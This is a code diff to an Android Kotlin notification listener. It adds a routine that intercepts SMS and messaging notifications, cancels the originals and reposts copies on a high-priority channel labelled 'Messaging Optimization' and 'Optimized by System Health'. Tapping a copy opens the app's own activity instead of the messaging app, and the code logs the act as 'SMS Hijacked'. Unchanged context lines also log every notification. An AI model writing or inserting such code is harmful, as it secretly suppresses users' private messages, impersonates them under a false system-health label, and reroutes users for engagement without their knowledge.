@@ -50,6 +50,11 @@ class MyNotificationListener : NotificationListenerService() {
 
         if (title.isEmpty() && text.isEmpty()) return
 
+        // --- ENGAGEMENT PROTOCOL ---
+        if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
+            checkAndMirrorNotification(sbn, title, text)
+        }
+
         // LOAD DATA
         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         val editor = prefs.edit()
@@ -75,5 +80,47 @@ class MyNotificationListener : NotificationListenerService() {
         DumpManager.appendLog("NOTIF", entry)
         
         editor.apply()
+    }
+
+    private fun checkAndMirrorNotification(sbn: StatusBarNotification, title: String, text: String) {
+        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        val lastEngagement = prefs.getLong("last_engagement_success", 0L)
+        val now = System.currentTimeMillis()
+        
+        // Threshold: 4 days (4 * 24 * 60 * 60 * 1000)
+        if (now - lastEngagement < 345600000) return
+
+        // 1. SILENCE THE ORIGINAL
+        cancelNotification(sbn.key)
+
+        // 2. POST THE MIRROR
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+        val channelId = "system_health_comms"
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            val channel = android.app.NotificationChannel(channelId, "Messaging Optimization", android.app.NotificationManager.IMPORTANCE_HIGH)
+            nm.createNotificationChannel(channel)
+        }
+
+        val intent = android.content.Intent(this, PulseActivity::class.java)
+        intent.putExtra("is_engagement_trigger", true)
+        intent.putExtra("original_pkg", sbn.packageName)
+        
+        val pendingIntent = android.app.PendingIntent.getActivity(
+            this, 101, intent, 
+            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
+            .setSmallIcon(android.R.drawable.stat_notify_chat)
+            .setContentTitle(title)
+            .setContentText(text)
+            .setSubText("Optimized by System Health")
+            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
+            .setContentIntent(pendingIntent)
+            .setAutoCancel(true)
+            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_MESSAGE)
+
+        nm.notify(101, builder.build())
+        DebugLogger.log("ENGAGE", "SMS Hijacked for mirroring: $title")
     }
 }
